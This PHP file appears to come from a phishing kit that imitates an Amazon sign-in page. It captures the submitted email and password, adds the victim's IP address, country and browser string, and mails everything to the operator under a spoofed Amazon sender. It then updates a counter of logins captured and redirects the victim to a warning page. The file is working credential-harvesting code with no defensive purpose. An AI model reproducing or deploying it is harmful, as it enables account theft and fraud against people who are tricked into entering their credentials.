<?php

/*
+-=[K]ucing[H]itam[S]hop=-+
*/

session_start();
$randomnumber = rand(1, 100);

include('../__CONFIG__.php');
require('../detect.php');
if (isset($_POST['Sex'])) {

	$_SESSION['EM'] = $_POST['EM'];
	$_SESSION['PW'] = $_POST['PW'];

	$message =
		"[+] ========. [ ❤️ BlackcheckerDZ ❤️ ] .======= [+]

----------------Account Amazon--------------------
Account    : " . $_SESSION['EM'] . "
Password   : " . $_SESSION['PW'] . "
--------------------PC Info-----------------------
IP         : " . $ip . " | " . $nama_negara . "
Browser    : " . $_SERVER['HTTP_USER_AGENT'] . "
[+] ========. [ ❤️ Time is Money ❤️ ] .====== [+]
";
	$file2 = "../../log/login.txt";
	$isi  = @file_get_contents($file2);
	$buka = fopen($file2, "w");
	fwrite($buka, $isi + 1);
	fclose($buka);
	$headers = "From: ❤ AMAZON ACCOUNT ❤  <amazon4-$randomnumber@freakzbrothers.team>";
	$subject = "Login: " . $_SESSION['EM'] . " - " . $ip . " - " . $nama_negara . " - " . $countryname . " - " . $contin_name . "";
	mail($to, $subject, $message, $headers);
	header('Location: ../warning.php?udm_cat_path=' . sha1(time()));
} else {
	# code...
}
